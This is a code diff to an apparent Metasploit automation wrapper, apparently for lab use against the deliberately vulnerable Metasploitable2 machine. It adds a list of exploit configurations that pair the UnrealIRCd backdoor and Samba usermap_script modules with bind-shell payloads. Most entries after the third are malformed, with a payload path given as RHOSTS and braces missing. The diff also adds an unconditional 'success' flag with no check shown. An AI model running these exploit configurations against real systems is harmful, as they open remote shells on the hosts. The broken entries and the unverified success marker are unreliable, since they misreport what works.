@@ -302,6 +302,7 @@ class Exploit(MetasploitModule):
             payload_details["job"] = job_details
         if payload_details:
             payload_details["target"] = self._target_host
+            payload_details['success'] = True
         return payload_details
 
     @metasploit_action_verification
@@ -585,5 +586,73 @@ Working exploits on metasploitable2
     }          
 }
 
+3)
+{
+    "name": "unix/irc/unreal_ircd_3281_backdoor",
+    "payloads": {
+        "cmd/unix/bind_perl": {}
+    },
+    "options": {
+        "RHOSTS": "<target_host>"
+    }          
+}
+
+4)
+ "name": "unix/irc/unreal_ircd_3281_backdoor",
+    "payloads": {
+        "cmd/unix/bind_perl": {}
+    },
+    "options": {
+        "RHOSTS": "payload/cmd/unix/bind_ruby"
+    }    
+
+5)
+"name": "unix/irc/unreal_ircd_3281_backdoor",
+    "payloads": {
+        "cmd/unix/bind_ruby_ipv6": {}
+    },
+    "options": {
+        "RHOSTS": "payload/cmd/unix/bind_ruby"
+    }
+6)
+"name": "exploit/multi/samba/usermap_script",
+    "payloads": {
+        "payload/cmd/unix/bind_awk": {}
+    },
+    "options": {
+        "RHOSTS": "payload/cmd/unix/bind_ruby"
+    }
+7)
+"name": "exploit/multi/samba/usermap_script",
+    "payloads": {
+        "payload/cmd/unix/bind_busybox_telnetd": {}
+    },
+    "options": {
+        "RHOSTS": "payload/cmd/unix/bind_ruby"
+    }   
+8)
+"name": "exploit/multi/samba/usermap_script",
+    "payloads": {
+        "payload/cmd/unix/bind_inetd": {}
+    },
+    "options": {
+        "RHOSTS": "payload/cmd/unix/bind_ruby"
+    }
+9)
+"name": "exploit/multi/samba/usermap_script",
+    "payloads": {
+        "payload/cmd/unix/bind_lua": {}
+    },
+    "options": {
+        "RHOSTS": "payload/cmd/unix/bind_ruby"
+    }       
+10)
+"name": "exploit/multi/samba/usermap_script",
+    "payloads": {
+        "payload/cmd/unix/bind_jjs": {}
+    },
+    "options": {
+        "RHOSTS": "payload/cmd/unix/bind_ruby"
+    }   
 
 """
